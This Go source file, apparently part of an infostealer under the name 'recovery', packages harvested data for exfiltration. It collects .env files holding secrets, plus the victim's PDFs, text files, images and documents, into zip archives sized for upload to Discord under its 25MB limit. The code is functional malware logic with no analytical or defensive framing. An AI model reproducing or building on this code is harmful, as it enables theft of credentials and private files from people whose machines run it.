package main

import (
	"fmt"
	"path/filepath"
	"strings"

	"recovery/recovery"
)

// Skip individual scanned files larger than this in phase-2 upload (Discord 25MB limit).
const maxScannedFileUploadSize = maxDiscordUpload - 3*1024*1024

func isEnvScannedFile(f recovery.FileResult) bool {
	name := strings.ToLower(f.Name)
	if name == ".env" || strings.HasPrefix(name, ".env.") {
		return true
	}
	return strings.ToLower(f.Ext) == ".env"
}

func appendEnvFileEntries(entries []archiveEntry, p *harvestPayload, seen map[string]bool) []archiveEntry {
	if p == nil || p.Result == nil {
		return entries
	}

	usedZip := make(map[string]int)
	add := func(path, name string) {
		if path == "" || seen[path] {
			return
		}
		seen[path] = true
		zipPath := uniqueFolder(envFileZipPath(path, name), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: path,
		})
	}

	for _, key := range p.Result.Keys {
		if key.Type != "env" {
			continue
		}
		add(key.Path, key.Name)
	}
	for _, f := range p.Result.Files {
		if !isEnvScannedFile(f) {
			continue
		}
		add(f.Path, f.Name)
	}
	return entries
}

func buildScannedFileEntries(p *harvestPayload) (entries []archiveEntry, skippedLarge int) {
	if p == nil || p.Result == nil {
		return nil, 0
	}

	usedZip := make(map[string]int)
	for _, f := range p.Result.Files {
		if isEnvScannedFile(f) {
			continue
		}
		if f.Size > maxScannedFileUploadSize {
			skippedLarge++
			continue
		}
		zipPath := uniqueFolder(scannedFileZipPath(f), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: f.Path,
		})
	}
	return entries, skippedLarge
}

func envFileZipPath(fullPath, name string) string {
	parent := filepath.Base(filepath.Dir(fullPath))
	if parent == "" || parent == "." {
		parent = "root"
	}
	return "env/" + sanitizeFilename(parent) + "/" + name
}

func scannedFileZipPath(f recovery.FileResult) string {
	dir := f.Dir
	if dir == "" {
		dir = "Unknown"
	}
	return fmt.Sprintf("files/%s/%s", sanitizeFilename(dir), f.Name)
}

func scannedFilesSummary(count, skippedLarge int) string {
	summary := fmt.Sprintf("Scanned files: %d\nPDF, TXT, images, documents, and other matched files.", count)
	if skippedLarge > 0 {
		summary += fmt.Sprintf("\nSkipped %d file(s) over %d MB (Discord upload limit).", skippedLarge, maxScannedFileUploadSize/(1024*1024))
	}
	return summary
}